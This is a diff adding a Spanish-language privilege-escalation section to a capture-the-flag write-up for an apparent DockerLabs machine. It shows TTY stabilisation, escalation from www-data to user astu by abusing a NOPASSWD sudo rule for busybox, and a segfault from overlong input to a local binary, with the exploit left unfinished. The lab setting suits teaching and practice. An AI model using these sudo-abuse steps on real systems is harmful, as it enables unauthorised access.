@@ -168,5 +168,51 @@ Por fin estamos dentro.
 ## ESCALADA DE PRIVILEGIOS
 
 
+Lo primero tratamiento de la TTY:
+```bash
+export TERM=xterm
+export SHELL=bash
+script /dev/null -c bash 
+^Z
+stty raw -echo; fg
+reset xterm
+stty rows 51 columns 237
+```
+primero miro si estoy en algún grupo con priviegios y nada, luego las variables de entorno y nada, pruebo:
+```bash
+sudo -l
+```
+```
+User www-data may run the following commands on dockerlabs:
+    (astu : astu) NOPASSWD: /usr/bin/busybox
+```
+miro en :
+```bash
+https://gtfobins.github.io/gtfobins/busybox/#sudo
+```
+información sobre el binario y ejecutando esto deberia escalar al usuario astu:
+```bash
+sudo -u astu /usr/bin/busybox sh
+```
 
+Ya somos astu, volvemos a mirar con "id" si estamos en algun grupo privilegiado, no es así, variable de entorno,
+nada, sudo -l no tenemos credenciales, así pues toca mirar que podemos encontrar.
+vamos al home de astu y hay una carpeta con un binario.
+lo ejecutamos :
+```bash
+./bs64
+```
+Ingrese el texto: sadasd
+c2FYXN
+```
+pues vamos a probar a ver si se trata de un bof:
+```
+./bs64
+Ingrese el texto: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+YWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYW=
+Segmentation fault
+```
+Segmentation fault, se trata de un bof.
+
+y hasta aquí he llegado porque no se hacer bof xD... tendré que ponerme a ello en un futuro.
 
